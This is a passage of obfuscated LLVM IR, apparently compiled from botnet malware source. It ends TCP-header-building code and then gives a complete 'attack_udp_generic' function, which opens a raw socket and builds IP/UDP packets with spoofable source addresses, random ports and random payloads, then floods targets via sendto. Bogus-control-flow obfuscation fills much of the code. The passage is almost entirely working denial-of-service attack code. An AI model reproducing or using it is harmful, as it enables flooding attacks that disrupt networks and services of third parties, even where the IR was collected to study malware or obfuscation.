  %gen210 = add i16 %_209, 1
  %_211 = sub i16 0, %1156
  %gen212 = add i16 %_211, 1
  %1160 = and i16 %1156, 1
  %_213 = sub i16 0, %1160
  %gen214 = add i16 %_213, 10
  %_215 = sub i16 %1160, 10
  %gen216 = mul i16 %_215, 10
  %1161 = shl i16 %1160, 10
  %_217 = sub i16 %1159, -1025
  %gen218 = mul i16 %_217, -1025
  %_219 = sub i16 0, %1159
  %gen220 = add i16 %_219, -1025
  %_221 = sub i16 0, %1159
  %gen222 = add i16 %_221, -1025
  %_223 = sub i16 0, %1159
  %gen224 = add i16 %_223, -1025
  %1162 = and i16 %1159, -1025
  %_225 = shl i16 %1162, %1161
  %_226 = sub i16 %1162, %1161
  %gen227 = mul i16 %_226, %1161
  %1163 = or i16 %1162, %1161
  store i16 %1163, i16* %1158, align 4
  %1164 = load i8, i8* %24, align 1
  %1165 = sext i8 %1164 to i16
  %1166 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1166, i32 0, i32 4
  %1168 = load i16, i16* %1167, align 4
  %_228 = sub i16 0, %1165
  %gen229 = add i16 %_228, 1
  %_230 = shl i16 %1165, 1
  %_231 = shl i16 %1165, 1
  %_232 = sub i16 0, %1165
  %gen233 = add i16 %_232, 1
  %_234 = sub i16 %1165, 1
  %gen235 = mul i16 %_234, 1
  %1169 = and i16 %1165, 1
  %_236 = sub i16 0, %1169
  %gen237 = add i16 %_236, 9
  %_238 = sub i16 0, %1169
  %gen239 = add i16 %_238, 9
  %_240 = sub i16 0, %1169
  %gen241 = add i16 %_240, 9
  %1170 = shl i16 %1169, 9
  %_242 = sub i16 0, %1168
  %gen243 = add i16 %_242, -513
  %_244 = shl i16 %1168, -513
  %_245 = sub i16 %1168, -513
  %gen246 = mul i16 %_245, -513
  %_247 = sub i16 %1168, -513
  %gen248 = mul i16 %_247, -513
  %_249 = sub i16 %1168, -513
  %gen250 = mul i16 %_249, -513
  %_251 = sub i16 %1168, -513
  %gen252 = mul i16 %_251, -513
  %_253 = shl i16 %1168, -513
  %_254 = sub i16 %1168, -513
  %gen255 = mul i16 %_254, -513
  %1171 = and i16 %1168, -513
  %_256 = sub i16 %1171, %1170
  %gen257 = mul i16 %_256, %1170
  %_258 = sub i16 0, %1171
  %gen259 = add i16 %_258, %1170
  %_260 = sub i16 0, %1171
  %gen261 = add i16 %_260, %1170
  %1172 = or i16 %1171, %1170
  store i16 %1172, i16* %1167, align 4
  %1173 = load i8, i8* %25, align 1
  %1174 = sext i8 %1173 to i16
  %1175 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1176 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1175, i32 0, i32 4
  %1177 = load i16, i16* %1176, align 4
  %_262 = sub i16 %1174, 1
  %gen263 = mul i16 %_262, 1
  %_264 = sub i16 0, %1174
  %gen265 = add i16 %_264, 1
  %1178 = and i16 %1174, 1
  %_266 = shl i16 %1178, 8
  %_267 = sub i16 %1178, 8
  %gen268 = mul i16 %_267, 8
  %_269 = sub i16 0, %1178
  %gen270 = add i16 %_269, 8
  %_271 = sub i16 %1178, 8
  %gen272 = mul i16 %_271, 8
  %_273 = shl i16 %1178, 8
  %_274 = sub i16 0, %1178
  %gen275 = add i16 %_274, 8
  %_276 = sub i16 0, %1178
  %gen277 = add i16 %_276, 8
  %1179 = shl i16 %1178, 8
  %_278 = sub i16 0, %1177
  %gen279 = add i16 %_278, -257
  %_280 = sub i16 0, %1177
  %gen281 = add i16 %_280, -257
  %_282 = shl i16 %1177, -257
  %_283 = sub i16 0, %1177
  %gen284 = add i16 %_283, -257
  %_285 = sub i16 0, %1177
  %gen286 = add i16 %_285, -257
  %_287 = sub i16 0, %1177
  %gen288 = add i16 %_287, -257
  %1180 = and i16 %1177, -257
  %_289 = sub i16 0, %1180
  %gen290 = add i16 %_289, %1179
  %_291 = shl i16 %1180, %1179
  %_292 = sub i16 %1180, %1179
  %gen293 = mul i16 %_292, %1179
  %_294 = sub i16 0, %1180
  %gen295 = add i16 %_294, %1179
  %_296 = sub i16 0, %1180
  %gen297 = add i16 %_296, %1179
  %_298 = sub i16 0, %1180
  %gen299 = add i16 %_298, %1179
  %1181 = or i16 %1180, %1179
  store i16 %1181, i16* %1176, align 4
  %1182 = load i8*, i8** %41, align 8
  %1183 = load i32, i32* %26, align 4
  call void @rand_alpha_str(i8* %1182, i32 %1183)
  %1184 = load i8*, i8** %41, align 8
  %1185 = load i32, i32* %26, align 4
  %1186 = sext i32 %1185 to i64
  %1187 = getelementptr inbounds i8, i8* %1184, i64 %1186
  store i8 0, i8* %1187, align 1
  br label %originalBB67

originalBB303alteredBB:                           ; preds = %originalBB303, %600
  %1188 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %1189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1188, i32 0, i32 4
  %1190 = load i16, i16* %1189, align 4
  %_304 = sub i16 0, %1190
  %gen305 = add i16 %_304, 8
  %1191 = lshr i16 %1190, 8
  %_306 = sub i16 0, %1191
  %gen307 = add i16 %_306, 1
  %1192 = and i16 %1191, 1
  %1193 = zext i16 %1192 to i32
  %1194 = icmp ne i32 %1193, 0
  br label %originalBB303

originalBB311alteredBB:                           ; preds = %originalBB311, %624
  %1195 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %1196 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1195, i32 0, i32 4
  %1197 = load i16, i16* %1196, align 4
  %_312 = sub i16 0, %1197
  %gen313 = add i16 %_312, 10
  %_314 = shl i16 %1197, 10
  %_315 = sub i16 %1197, 10
  %gen316 = mul i16 %_315, 10
  %_317 = sub i16 0, %1197
  %gen318 = add i16 %_317, 10
  %1198 = lshr i16 %1197, 10
  %1199 = and i16 %1198, 1
  %1200 = zext i16 %1199 to i32
  %1201 = icmp ne i32 %1200, 0
  br label %originalBB311

originalBB322alteredBB:                           ; preds = %originalBB322, %651
  br label %originalBB322

originalBB326alteredBB:                           ; preds = %originalBB326, %670
  %1202 = call i64 @time(i64* null) #6
  %1203 = load i64, i64* %34, align 8
  %_327 = sub i64 0, %1202
  %gen328 = add i64 %_327, %1203
  %_329 = sub i64 %1202, %1203
  %gen330 = mul i64 %_329, %1203
  %_331 = shl i64 %1202, %1203
  %1204 = sub nsw i64 %1202, %1203
  %1205 = icmp sgt i64 %1204, 10
  br label %originalBB326

originalBB335alteredBB:                           ; preds = %originalBB335, %691
  %1206 = load i32, i32* %29, align 4
  %1207 = call i32 @close(i32 %1206)
  br label %originalBB335

originalBB339alteredBB:                           ; preds = %originalBB339, %712
  %1208 = load i32, i32* %11, align 4
  %_340 = shl i32 %1208, 1
  %_341 = shl i32 %1208, 1
  %_342 = sub i32 0, %1208
  %gen343 = add i32 %_342, 1
  %1209 = add nsw i32 %1208, 1
  store i32 %1209, i32* %11, align 4
  br label %originalBB339

originalBB347alteredBB:                           ; preds = %originalBB347, %731
  br label %originalBB347

originalBB351alteredBB:                           ; preds = %originalBB351, %749
  %1210 = load i32, i32* %11, align 4
  %1211 = load i8, i8* %7, align 1
  %1212 = zext i8 %1211 to i32
  %1213 = icmp slt i32 %1210, %1212
  br label %originalBB351

originalBB355alteredBB:                           ; preds = %originalBB355, %796
  %1214 = load i8*, i8** %45, align 8
  %1215 = load i32, i32* %26, align 4
  call void @rand_alpha_str(i8* %1214, i32 %1215)
  %1216 = load i8*, i8** %45, align 8
  %1217 = load i32, i32* %26, align 4
  %1218 = sext i32 %1217 to i64
  %1219 = getelementptr inbounds i8, i8* %1216, i64 %1218
  store i8 0, i8* %1219, align 1
  br label %originalBB355

originalBB359alteredBB:                           ; preds = %originalBB359, %894
  %1220 = call i64 @time(i64* null) #6
  %1221 = load i32, i32* %28, align 4
  %1222 = sext i32 %1221 to i64
  %1223 = icmp sgt i64 %1220, %1222
  br label %originalBB359

originalBB363alteredBB:                           ; preds = %originalBB363, %917
  br label %originalBB363
}

declare i32 @fcntl(i32, i32, ...) #3

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 19, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %23, align 4
  %76 = load i16, i16* %20, align 2
  %77 = zext i16 %76 to i32
  %78 = icmp sgt i32 %77, 1460
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %5
  store i16 1460, i16* %20, align 2
  br label %80

; <label>:80:                                     ; preds = %79, %5
  %81 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %81, i32* %12, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %84

; <label>:83:                                     ; preds = %80
  br label %394

; <label>:84:                                     ; preds = %80
  store i32 1, i32* %11, align 4
  %85 = load i32, i32* %12, align 4
  %86 = bitcast i32* %11 to i8*
  %87 = call i32 @setsockopt(i32 %85, i32 0, i32 3, i8* %86, i32 4) #6
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %89, label %108

; <label>:89:                                     ; preds = %84
  %90 = load i32, i32* @x.27
  %91 = load i32, i32* @y.28
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %89
  %98 = load i32, i32* %12, align 4
  %99 = call i32 @close(i32 %98)
  %100 = load i32, i32* @x.27
  %101 = load i32, i32* @y.28
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %394

; <label>:108:                                    ; preds = %84
  store i32 0, i32* %11, align 4
  br label %109

; <label>:109:                                    ; preds = %originalBBpart219, %108
  %110 = load i32, i32* %11, align 4
  %111 = load i8, i8* %7, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp slt i32 %110, %112
  br i1 %113, label %114, label %226

; <label>:114:                                    ; preds = %109
  %115 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %116 = load i8**, i8*** %13, align 8
  %117 = load i32, i32* %11, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8*, i8** %116, i64 %118
  store i8* %115, i8** %119, align 8
  %120 = load i8**, i8*** %13, align 8
  %121 = load i32, i32* %11, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8*, i8** %120, i64 %122
  %124 = load i8*, i8** %123, align 8
  %125 = bitcast i8* %124 to %struct.iphdr*
  store %struct.iphdr* %125, %struct.iphdr** %24, align 8
  %126 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i64 1
  %128 = bitcast %struct.iphdr* %127 to %struct.udphdr*
  store %struct.udphdr* %128, %struct.udphdr** %25, align 8
  %129 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %130 = bitcast %struct.iphdr* %129 to i8*
  %131 = load i8, i8* %130, align 4
  %132 = and i8 %131, 15
  %133 = or i8 %132, 64
  store i8 %133, i8* %130, align 4
  %134 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, -16
  %138 = or i8 %137, 5
  store i8 %138, i8* %135, align 4
  %139 = load i8, i8* %14, align 1
  %140 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 1
  store i8 %139, i8* %141, align 1
  %142 = load i16, i16* %20, align 2
  %143 = zext i16 %142 to i64
  %144 = add i64 28, %143
  %145 = trunc i64 %144 to i16
  %146 = call zeroext i16 @htons(i16 zeroext %145) #7
  %147 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 2
  store i16 %146, i16* %148, align 2
  %149 = load i16, i16* %15, align 2
  %150 = call zeroext i16 @htons(i16 zeroext %149) #7
  %151 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 3
  store i16 %150, i16* %152, align 4
  %153 = load i8, i8* %16, align 1
  %154 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 5
  store i8 %153, i8* %155, align 4
  %156 = load i8, i8* %17, align 1
  %157 = icmp ne i8 %156, 0
  br i1 %157, label %158, label %178

; <label>:158:                                    ; preds = %114
  %159 = load i32, i32* @x.27
  %160 = load i32, i32* @y.28
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %158
  %167 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %168 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 4
  store i16 %167, i16* %169, align 2
  %170 = load i32, i32* @x.27
  %171 = load i32, i32* @y.28
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %178

; <label>:178:                                    ; preds = %originalBBpart24, %114
  %179 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  store i8 17, i8* %180, align 1
  %181 = load i32, i32* %22, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 8
  store i32 %181, i32* %183, align 4
  %184 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %185 = load i32, i32* %11, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 1
  %189 = load i32, i32* %188, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 9
  store i32 %189, i32* %191, align 4
  %192 = load i16, i16* %18, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i32 0, i32 0
  store i16 %193, i16* %195, align 2
  %196 = load i16, i16* %19, align 2
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %199 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %198, i32 0, i32 1
  store i16 %197, i16* %199, align 2
  %200 = load i16, i16* %20, align 2
  %201 = zext i16 %200 to i64
  %202 = add i64 8, %201
  %203 = trunc i64 %202 to i16
  %204 = call zeroext i16 @htons(i16 zeroext %203) #7
  %205 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %206 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %205, i32 0, i32 2
  store i16 %204, i16* %206, align 2
  br label %207

; <label>:207:                                    ; preds = %178
  %208 = load i32, i32* @x.27
  %209 = load i32, i32* @y.28
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %207
  %216 = load i32, i32* %11, align 4
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %11, align 4
  %218 = load i32, i32* @x.27
  %219 = load i32, i32* @y.28
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart219, label %originalBB6alteredBB

originalBBpart219:                                ; preds = %originalBB6
  br label %109

; <label>:226:                                    ; preds = %109
  br label %227

; <label>:227:                                    ; preds = %393, %226
  store i32 0, i32* %11, align 4
  br label %228

; <label>:228:                                    ; preds = %originalBBpart231, %227
  %229 = load i32, i32* %11, align 4
  %230 = load i8, i8* %7, align 1
  %231 = zext i8 %230 to i32
  %232 = icmp slt i32 %229, %231
  br i1 %232, label %233, label %387

; <label>:233:                                    ; preds = %228
  %234 = load i8**, i8*** %13, align 8
  %235 = load i32, i32* %11, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds i8*, i8** %234, i64 %236
  %238 = load i8*, i8** %237, align 8
  store i8* %238, i8** %26, align 8
  %239 = load i8*, i8** %26, align 8
  %240 = bitcast i8* %239 to %struct.iphdr*
  store %struct.iphdr* %240, %struct.iphdr** %27, align 8
  %241 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i64 1
  %243 = bitcast %struct.iphdr* %242 to %struct.udphdr*
  store %struct.udphdr* %243, %struct.udphdr** %28, align 8
  %244 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %245 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %244, i64 1
  %246 = bitcast %struct.udphdr* %245 to i8*
  store i8* %246, i8** %29, align 8
  %247 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %248 = load i32, i32* %11, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %250, i32 0, i32 2
  %252 = load i8, i8* %251, align 4
  %253 = zext i8 %252 to i32
  %254 = icmp slt i32 %253, 32
  br i1 %254, label %255, label %276

; <label>:255:                                    ; preds = %233
  %256 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %257 = load i32, i32* %11, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i32 0, i32 1
  %261 = load i32, i32* %260, align 4
  %262 = call i32 @ntohl(i32 %261) #7
  %263 = call i32 @rand_next()
  %264 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %265 = load i32, i32* %11, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %264, i64 %266
  %268 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %267, i32 0, i32 2
  %269 = load i8, i8* %268, align 4
  %270 = zext i8 %269 to i32
  %271 = lshr i32 %263, %270
  %272 = add i32 %262, %271
  %273 = call i32 @htonl(i32 %272) #7
  %274 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 9
  store i32 %273, i32* %275, align 4
  br label %276

; <label>:276:                                    ; preds = %255, %233
  %277 = load i32, i32* %22, align 4
  %278 = icmp eq i32 %277, -1
  br i1 %278, label %279, label %283

; <label>:279:                                    ; preds = %276
  %280 = call i32 @rand_next()
  %281 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 8
  store i32 %280, i32* %282, align 4
  br label %283

; <label>:283:                                    ; preds = %279, %276
  %284 = load i16, i16* %15, align 2
  %285 = zext i16 %284 to i32
  %286 = icmp eq i32 %285, 65535
  br i1 %286, label %287, label %292

; <label>:287:                                    ; preds = %283
  %288 = call i32 @rand_next()
  %289 = trunc i32 %288 to i16
  %290 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 3
  store i16 %289, i16* %291, align 4
  br label %292

; <label>:292:                                    ; preds = %287, %283
  %293 = load i16, i16* %18, align 2
  %294 = zext i16 %293 to i32
  %295 = icmp eq i32 %294, 65535
  br i1 %295, label %296, label %301

; <label>:296:                                    ; preds = %292
  %297 = call i32 @rand_next()
  %298 = trunc i32 %297 to i16
  %299 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %300 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %299, i32 0, i32 0
  store i16 %298, i16* %300, align 2
  br label %301

; <label>:301:                                    ; preds = %296, %292
  %302 = load i16, i16* %19, align 2
  %303 = zext i16 %302 to i32
  %304 = icmp eq i32 %303, 65535
  br i1 %304, label %305, label %310

; <label>:305:                                    ; preds = %301
  %306 = call i32 @rand_next()
  %307 = trunc i32 %306 to i16
  %308 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %309 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %308, i32 0, i32 1
  store i16 %307, i16* %309, align 2
  br label %310

; <label>:310:                                    ; preds = %305, %301
  %311 = load i8, i8* %21, align 1
  %312 = icmp ne i8 %311, 0
  br i1 %312, label %313, label %321

; <label>:313:                                    ; preds = %310
  %314 = load i8*, i8** %29, align 8
  %315 = load i16, i16* %20, align 2
  %316 = zext i16 %315 to i32
  call void @rand_alpha_str(i8* %314, i32 %316)
  %317 = load i8*, i8** %29, align 8
  %318 = load i16, i16* %20, align 2
  %319 = zext i16 %318 to i64
  %320 = getelementptr inbounds i8, i8* %317, i64 %319
  store i8 0, i8* %320, align 1
  br label %321

; <label>:321:                                    ; preds = %313, %310
  %322 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 7
  store i16 0, i16* %323, align 2
  %324 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %325 = bitcast %struct.iphdr* %324 to i16*
  %326 = call zeroext i16 @checksum_generic(i16* %325, i32 20)
  %327 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 7
  store i16 %326, i16* %328, align 2
  %329 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %330 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %329, i32 0, i32 3
  store i16 0, i16* %330, align 2
  %331 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %332 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %333 = bitcast %struct.udphdr* %332 to i8*
  %334 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %335 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %334, i32 0, i32 2
  %336 = load i16, i16* %335, align 2
  %337 = load i16, i16* %20, align 2
  %338 = zext i16 %337 to i64
  %339 = add i64 8, %338
  %340 = trunc i64 %339 to i32
  %341 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %331, i8* %333, i16 zeroext %336, i32 %340)
  %342 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %343 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %342, i32 0, i32 3
  store i16 %341, i16* %343, align 2
  %344 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %345 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %344, i32 0, i32 1
  %346 = load i16, i16* %345, align 2
  %347 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %348 = load i32, i32* %11, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %350, i32 0, i32 0
  %352 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %351, i32 0, i32 1
  store i16 %346, i16* %352, align 2
  %353 = load i32, i32* %12, align 4
  %354 = load i8*, i8** %26, align 8
  %355 = load i16, i16* %20, align 2
  %356 = zext i16 %355 to i64
  %357 = add i64 28, %356
  %358 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %359 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %360 = load i32, i32* %11, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %359, i64 %361
  %363 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i32 0, i32 0
  %364 = bitcast %struct.sockaddr_in* %363 to %struct.sockaddr*
  store %struct.sockaddr* %364, %struct.sockaddr** %358, align 8
  %365 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %366 = load %struct.sockaddr*, %struct.sockaddr** %365, align 8
  %367 = call i64 @sendto(i32 %353, i8* %354, i64 %357, i32 16384, %struct.sockaddr* %366, i32 16)
  br label %368

